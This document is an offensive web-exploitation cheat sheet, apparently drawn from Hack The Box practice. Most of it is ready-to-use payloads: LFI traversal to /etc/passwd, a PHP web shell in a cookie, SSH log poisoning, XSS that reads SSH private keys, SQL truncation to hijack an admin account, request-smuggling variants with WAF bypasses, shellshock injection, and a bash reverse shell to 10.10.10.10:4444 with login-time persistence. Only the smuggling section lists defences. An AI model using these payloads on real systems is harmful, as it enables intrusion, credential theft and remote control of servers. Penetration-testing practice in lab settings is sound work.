# Exploitation Techniques

### LFI

#### Displaying the contents of files

```
http://<url>?attr=../../../../../../../../../etc/passwd
```

#### Finding hidden information in encoded format

```
http://<url>?page=php://filter/convert.base64-encode/resource=index
```

#### If a cookie is vulnerable

- Vulnerable PHP code

```php
<?php
if (isset($_COOKIE["lang"]))
{
    include("lang/".$_COOKIE['lang']);
}
?>
```

- Change "Cookie" in request headers while sending the request to get web shell

```
Cookie: lang?=<?php echo system($_GET["cmd"]);?>
```

- Sometimes base64 encoded cookies leak valuable information about the user and they can be further exploited to run commads on the server.
  ##### Example
  - If it's a NodeJS express app and is using the "serialize" library to unserialize and serialize stuff.
  - Then we can use the same function to create our own payload and pass it as cookie in order to gain a shell.
  - reverse shell payload can be generated using nodejsshell.py

### FTP log file poisoning

- add a bash command in ftp username prompt when we try to connect to some machine's ftp server

### SSH log file poisoning

- add a php one liner in the SSH username prompt during login and then try command injection on the log file

```bash
ssh '<?php system($_GET["cmd"]);?>'@<ip>

# url
/file.php?file=../../../../../../../../var/log/auth.log&cmd=id

# if the LFI only reads log files, then
/file.php?file=../../../../../../../../var/log/auth&cmd=id
```

### SQL Truncation attack

- if the website has some limit on username or email fields

```javascript
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
```

- so this script shows us that the input in the fields should be limited to a set number of characters.
- If we create an account with a name like "admin hello", the script will truncate all characters after the 10th character, and our name will become admin
- For this the form must allow entering spaces
- the webpage seems to perform a client side email validation, to bypass that, we craft our request using burp

```
POST /index.php HTTP/1.1
Host: book.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://book.htb/index.php
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 61

name=admin+++++a&email=admin%40book.htb++++++a&password=hello
```

### XSS attack for LFI if some files are dynamically generated

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

- We can use this method to find other interesting files, like id_rsa

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

### Web authentication bypass

- If a website allows authenticated users to edit content on a page, like a blogging website, you can check for login bypass using curl
- Sometimes unauthenticated POST requests are accepted

```bash
curl -v -X POST <url to make the POST request to>
```

### Request Splitting Attack

- Content-Length determines the length of the request body (including the newline and spaces)
- Transfer-Encoding: chunked

```
Transfer-Encoding: chunked

b
q=smuggling
0 # anything after 0 will be considered as a new request, 0 is the terminating character
```

#### Ways to exploit this:

1. CL:CL

   - **Original request**

   ```
   Get /HTTP/1.1
   Content-Length: 45
   Host: cyber.com

   Get /reqsmuggle HTTP/1.1
   Host: cyber.com
   ```

   - due to the mismatch in backend and frontend requests... it will consider the second part as a different request and will send two responses
   - **Backend response**

   ```
   HTTP/1.1 200 OK
   Content-Length: 11

   hello worldHTTP/1.1 404 Not Found
   Connection: Close
   Content-Length: 0
   ```

2. CL:TE

- Usually the Transfer-Encoding is supposed to override the Content-Length, but if that's not the case due to some vulnerability and it prioritizes Content-Length

  ```
  POST /login HTTP/1.1
  Host: cyber.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 62
  Transfer-Encoding: chunked

  16 									# all this is considered as request body
  login=xxx&password=xxx				# but the chunked transfer-encoding tells
  0									# tells the backend server that these are
  GET /404 HTTP/1.1 					# are separate requests
  X-Foo: bar
  ```

- **Bypassing Transfer-Encoding** (Sometimes it is blacklisted by WAF)
  - Transfer-Encoding: xchunked
  - Transfer-Encoding : chunked
  - Transfer-Encoding: chunked
  - Transfer-Encoding: x
  - Transfer-Encoding: [tab]chunked
  - [space]Transfer-Encoding: chunked
  - X:X[\n]Transfer-Encoding: chunked
  - Transfer-Encoding
    : chunked

3. TE:CL
   **Front-end**

- TE > CL
- So the front-end will simply consider anything within 8 and 0 upto 8 characters as the request body

```
POST / HTTP/1.1
Host: cyber.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Back-end **

- CL > TE
  It will consider `SMUGGLED` as a new request

#### Prevention

- Prioritize transfer encoding over content-length in both front-end back-end
- Disallow requests with both content-length and transfer-encoding and double content-length headers
- Disallow malformed Transfer-Encoding headers and correct Processing of Multiple TE Values
- Configure WAF to detect and block ambiguous requests
- Use the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests

### Tomcat

#### Directory Traversal

- if /manager/html is blocked (401 Unauthorized) then try /manager/status/..;/html (/manager/status is accessible)
- send POST requests similarly

### Exploiting Mail servers

- Found a mail server running on port 25
  - check if it's running any script when a mail is sent, like 'disclaimer'
  - usually it's stored in /etc/postfix directory
  ```bash
  # add a line for reverse shell in the script
  bash -i >& /dev/tcp/10.10.10.10/4444 2>&1
  ...
  ```
  - Now use a python script or send a mail manually to a **valid** email address registered on that machine to trigger this script
- Sometimes directory traversal is possible in RCPT field
  - Mail service always creates a separate folder and file for a certain user's mail
  - For example, John's mail will be stored in /var/mail/John
  - If directory traversal is possible, then we can create a user ../../../../../../../etc/bash_completion.d
    - then we can enter a reverse shell script as the DATA, mail service will create the /etc/bash_completion.d directory with the contents we had provided
    - when a user logs in, it'll be executed because bash_completion.d is executed every time a user logs in to the machine

### web.config

- if a windows web server allows file upload we may upload a config file to the server that downloads and runs a powershell reverse shell script
  ![Editing web.config](app://local/D%3A%5Cpentesting%5CHTB%20Machines%5CBounty%20-%20Windows%20303fa44a9deb4c588306fcbcbb3ee384%5CUntitled%202.png?1635291298000)

### directory traversal in /admin

- some nginx/apache web servers are vulnerable to directory traversal vulnerabilities
  - if /admin is unauthorized then try fuzzing /admin../FUZZ
  ```bash
  ffuf -u http://victim.com/admin../FUZZ -w wordlist.txt
  ```

### cgi-bin shellshock

- if a web server is running a bash script in /cgi-bin/somefile, then change the user agent as such for command injection

```
User-Agent: () { :; }; echo; echo; /usr/bin/whoami
```

- Read more about this: https://d00mfist1.gitbooks.io/ctf/content/shellshock.html

